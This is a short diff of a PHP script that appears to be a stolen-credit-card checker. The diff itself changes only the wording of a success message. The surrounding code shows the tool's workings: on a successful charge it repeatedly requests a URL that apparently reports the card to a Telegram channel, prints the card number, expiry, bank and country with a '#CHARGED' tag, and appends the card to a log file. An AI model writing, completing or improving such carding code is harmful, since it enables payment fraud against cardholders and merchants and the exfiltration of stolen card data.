@@ -413,7 +413,7 @@ if (strpos($final, '"status": "succeeded"')) {
     while (!$sendchargedtotg && $num_retries < $max_retries) {
     $sendchargedtotg = @file_get_contents($sendcharged);
     $num_retries++;
-    echo ''.$myip.'<span class="badge badge-success">#CHARGED</span> <font class="text-white">'.$cc.'|'.$mm.'|'.$yy.'</font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>Amount: '.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
+    echo ''.$myip.'<span class="badge badge-success">#CHARGED</span> <font class="text-white">'.$cc.'|'.$mm.'|'.$yy.'</font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>➤ Amount: '.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
     fwrite(fopen('auto-charged-ccs.txt', 'a'), $card."\r\n");
     }
 exit;
